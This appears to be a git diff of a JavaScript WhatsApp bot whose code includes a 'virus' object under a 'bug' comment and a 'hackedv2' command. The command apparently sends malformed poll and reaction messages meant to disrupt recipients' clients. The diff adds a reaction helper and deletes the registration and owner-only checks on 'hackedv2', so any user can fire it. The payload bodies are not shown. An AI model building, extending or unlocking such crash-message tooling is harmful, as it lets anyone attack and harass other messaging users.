@@ -112,6 +112,9 @@ module.exports = xinn = async (xinn, m, chatUpdate, store) => {
         /*const replay = (teks) => {
             xinn.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": ` Join Bot's Official GC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/zarin.jpg`),"sourceUrl": "https://chat.whatsapp.com/GV7aZJEEPGa1GhJe4j3nZp"}}}, { quoted: m})
         }*/
+const sendRacMessage = (id, text1 = {}) => {
+const reactionMessage = {react: {text: text1,key: m.key}}
+xinn.sendMessage(id, reactionMessage)}
 
 //bug nya
 	const virus =  {
@@ -555,9 +558,7 @@ break
 
 case 'hackedv2':
 {
-if (!isRegist) return onlyRegist()
-if (!isOwner && !xinn.key.fromMe) return onlyOwner('6282143067466') 
-var bugreact = await xinn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: xinn.id } } })
+var bugreact = await xinn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: m.id } } })
 var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
 "pollCreationMessage": {
 "name": "HALO DEKK 🥶", 
